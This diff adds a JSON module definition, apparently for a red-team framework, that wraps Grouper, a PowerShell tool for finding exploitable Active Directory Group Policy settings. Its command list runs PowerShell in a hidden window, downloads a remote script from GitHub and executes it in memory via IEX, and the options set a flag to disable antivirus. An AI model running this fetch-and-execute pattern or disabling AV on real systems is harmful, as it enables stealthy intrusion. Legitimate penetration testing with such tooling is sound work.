@@ -1,0 +1,33 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Grouper",
+    "author": ["(@l0ss)"],
+    "path": ["windows", "x64", "powershell", "lateral", "gpo", "grouper.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Grouper is a slightly wobbly PowerShell module designed for pentesters and redteamers (although probably also useful for sysadmins) which sifts through the (usually very noisy) XML output from the Get-GPOReport cmdlet (part of Microsoft's Group Policy module) and identifies all the settings defined in Group Policy Objects (GPOs) that might prove useful to someone trying to do something fun/evil.",
+    "remote": "https://raw.githubusercontent.com/l0ss/Grouper/master/grouper.ps1",
+    "local": ["data", "src", "l0ss", "Grouper", "grouper.ps1"],
+    "options": {
+      "ComputerName": [""],
+      "showDisabled": [],
+      "Level": ["1", "2","3"]
+    },
+    "description": "A PowerShell script for helping to find vulnerable settings in AD Group Policy.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "Get-GPOReport -All -ReportType xml -Path C:\\temp\\gporeport.xml;",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/l0ss/Grouper/master/grouper.ps1');Invoke-AuditGPOReport -Path C:\\temp\\gporeport.xml\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
